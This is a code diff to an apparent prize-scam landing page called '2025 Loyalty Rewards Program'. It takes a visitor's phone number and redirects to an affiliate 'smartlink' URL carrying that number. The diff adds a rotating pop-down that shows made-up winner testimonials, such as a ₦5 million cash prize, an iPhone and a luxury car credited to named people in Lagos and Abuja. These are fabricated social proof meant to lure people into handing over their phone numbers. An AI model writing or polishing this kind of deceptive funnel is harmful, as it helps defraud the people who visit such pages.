@@ -33,7 +33,6 @@
       line-height: 1.5;
       color: #ccc;
     }
-
     .image-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -47,7 +46,6 @@
       border-radius: 8px;
       border: 2px solid #333;
     }
-
     .below-image-text {
       text-align: center;
       margin-bottom: 20px;
@@ -154,9 +152,46 @@
       margin-top: 20px;
       text-align: center;
     }
+
+    /* ===== POP-DOWN TESTIMONIAL ===== */
+    .testimonial-popup {
+      position: fixed;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1b1b1b;
+      color: #fff;
+      border-radius: 8px;
+      padding: 12px 18px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+      font-size: 14px;
+      z-index: 2000;
+      transition: top 0.5s ease;
+      border: 1px solid #ff4444;
+    }
+    .testimonial-popup.show {
+      top: 20px;
+    }
+    .testimonial-popup img {
+      width: 24px;
+      height: 24px;
+    }
+    .testimonial-text strong {
+      color: #ff4444;
+    }
   </style>
 </head>
 <body>
+
+  <!-- Testimonial Pop-down -->
+  <div id="testimonial" class="testimonial-popup">
+    <img src="https://cdn-icons-png.flaticon.com/512/4225/4225683.png" alt="gift"/>
+    <div class="testimonial-text"></div>
+  </div>
+
   <div class="container">
     <div class="header">
       <h1>2025 Loyalty Rewards Program</h1>
@@ -238,6 +273,28 @@
       const number = document.getElementById('msisdn').value;
       window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
     }
+
+    // Testimonial popup rotation
+    const testimonials = [
+      "Aisha just won a <strong>20GB Data bundle</strong> for a year!",
+      "John from Lagos won a <strong>₦5 Million Cash Prize</strong>!",
+      "Chioma just received a brand new <strong>iPhone 14 Pro Max</strong>!",
+      "Emeka claimed <strong>Unlimited Data for 6 months</strong>!",
+      "Zainab from Abuja won a <strong>Luxury Car</strong>!"
+    ];
+
+    function showTestimonial(text) {
+      const popup = document.getElementById('testimonial');
+      popup.querySelector('.testimonial-text').innerHTML = text;
+      popup.classList.add('show');
+      setTimeout(() => popup.classList.remove('show'), 5000);
+    }
+
+    let tIndex = 0;
+    setInterval(() => {
+      showTestimonial(testimonials[tIndex]);
+      tIndex = (tIndex + 1) % testimonials.length;
+    }, 8000);
   </script>
 </body>
 </html>
